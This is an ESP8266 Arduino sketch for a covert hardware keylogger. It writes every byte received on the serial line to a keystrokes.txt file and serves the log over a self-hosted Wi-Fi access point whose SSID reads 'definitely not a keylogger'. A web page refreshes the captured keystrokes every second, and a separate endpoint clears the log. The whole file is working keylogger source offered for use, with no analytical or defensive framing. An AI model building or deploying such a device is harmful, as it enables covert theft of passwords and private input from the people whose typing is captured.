#include <ESP8266WiFi.h>
#include <FS.h>
#include <ESP8266mDNS.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFSEditor.h>
#include <EEPROM.h>


#define BAUD_RATE 115200

/* ============= CHANGE WIFI CREDENTIALS ============= */
const char *ssid = "definitely not a keylogger";
const char *password = "!keylogger"; //min 8 chars
/* ============= ======================= ============= */
  
AsyncWebServer server(80);
FSInfo fs_info;
File f;
String page = "";
String data = "";


void setup() {
  
  Serial.begin(BAUD_RATE);
  
  //Serial.println(WiFi.SSID());
  WiFi.mode(WIFI_STA);
  WiFi.softAP(ssid,password);
  
  EEPROM.begin(4096);
  SPIFFS.begin();
  
  MDNS.addService("http","tcp",80);

  f = SPIFFS.open("/keystrokes.txt", "a+");
  if(!f) Serial.println("file open failed");

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    data = (String)f;
    request->send(SPIFFS, "/keystrokes.txt", "text/plain");
  });

   server.on("/keylogger", HTTP_GET, [](AsyncWebServerRequest *request){
    page = "<head> <link href='https://fonts.googleapis.com/css?family=Roboto&display=swap' rel='stylesheet'></head>\r\n";
    page += "<h1>Keylogger keys</h1>\r\n";
    page += "<a href='/clear'>Apagar registros</a><br><h1>Log:</h1>\r\n";
    page += "<h4 style='font-family: \"Roboto\", sans-serif;' id=\"data\">""</h4>\r\n";
    page += "<script>\r\n";
    page += "var x = setInterval(function() {loadData(\"/\",updateData)}, 1000);\r\n";
    page += "function loadData(url, callback){\r\n";
    page += "var xhttp = new XMLHttpRequest();\r\n";
    page += "xhttp.onreadystatechange = function(){\r\n";
    page += " if(this.readyState == 4 && this.status == 200){\r\n";
    page += " callback.apply(xhttp);\r\n";
    page += " }\r\n";
    page += "};\r\n";
    page += "xhttp.open(\"GET\", url, true);\r\n";
    page += "xhttp.send();\r\n";
    page += "}\r\n";
    page += "function updateData(){\r\n";
    page += " document.getElementById(\"data\").innerHTML = this.responseText;\r\n";
    page += "}\r\n";
    page += "</script>\r\n";
    request->send(200, "text/html", page);
  });

  server.on("/clear", HTTP_GET, [](AsyncWebServerRequest *request){
    f.close();
    f = SPIFFS.open("/keystrokes.txt", "w");
    request->send(200, "text/plain", "file cleared!");
  });
  
  server.begin();
}

void loop() {
  
  if(Serial.available()) {
    f.write(Serial.read());
  }
  
}
